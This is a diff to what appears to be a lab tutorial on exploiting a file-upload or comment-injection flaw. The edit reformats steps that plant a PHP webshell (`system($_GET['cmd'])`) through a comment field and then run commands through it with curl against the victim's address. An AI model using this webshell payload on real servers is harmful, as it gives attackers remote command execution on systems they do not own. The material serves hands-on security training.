@@ -81,14 +81,11 @@
     to.
 
 16. To exploit the vulnerability we see before, enter test in the name bar, enter user.php in the
-    email bar, and <?php $exec = system( $_GET['cmd'] ) ?> in the comment section. After
+    email bar, and ``<?php $exec = system( $_GET['cmd'] ) ?>`` in the comment section. After
     entering all the text, click submit to plant the webshell
-    ```
-    root:~# curl http://<victim's IP address>/user_info/test_user.php?cmd=whoami root
-    ```
 
-18. On the attacker VM, use the command curl
-    http://<victim's IP address>/user_info/test_user.php?cmd=whoami to test whether the planted
+18. On the attacker VM, use the command ``curl
+    http://<victim's IP address>/user_info/test_user.php?cmd=whoami`` to test whether the planted
     webshell is working or not.
 
 19. A secure server is running on the address <secure's IP address>, you are welcome to try attacking
